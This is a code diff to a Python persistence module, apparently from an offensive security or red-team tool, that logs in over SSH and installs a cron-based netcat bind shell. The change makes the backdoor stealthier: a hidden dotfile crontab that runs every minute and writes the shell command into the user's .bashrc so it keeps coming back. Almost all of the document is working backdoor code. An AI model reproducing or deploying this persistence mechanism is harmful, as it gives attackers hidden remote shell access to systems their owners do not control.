@@ -18,12 +18,17 @@ class CronPersistence(BasePersistence):
             command = "mkdir -p /home/{}/.cron".format(self._user.username)
             ssh_shell.send_command(command)
 
-            command = "*/5 * * * * echo \"NC=\`which nc\` && mknod /tmp/backpipe p 2>/dev/null; " \
-                      "/bin/sh 0</tmp/backpipe | \$NC -lp {} 1>/tmp/backpipe &disown\" " \
-                      ">> /home/{}/.cron/crontab".format(self._listen_port, self._user.username)
+            command = "echo \"*/1 * * * * echo \\\"cp -f /etc/skel/.bashrc /home/{}/.bashrc 2>/dev/null; " \
+                      "NC=\\\`which nc\\\` && mknod /tmp/backpipe p 2>/dev/null; " \
+                      "/bin/sh 0</tmp/backpipe | \\\$NC -lp {} 1>/tmp/backpipe &disown\\\" " \
+                      ">> /home/{}/.bashrc\" " \
+                      ">> /home/{}/.cron/.crontab".format(self._user.username,
+                                                         self._listen_port,
+                                                         self._user.username,
+                                                         self._user.username)
             ssh_shell.send_command(command)
 
-            command = "crontab /home/{}/.cron/crontab".format(self._user.username)
+            command = "crontab /home/{}/.cron/.crontab".format(self._user.username)
             ssh_shell.send_command(command)
 
             ssh_shell.close_connection()
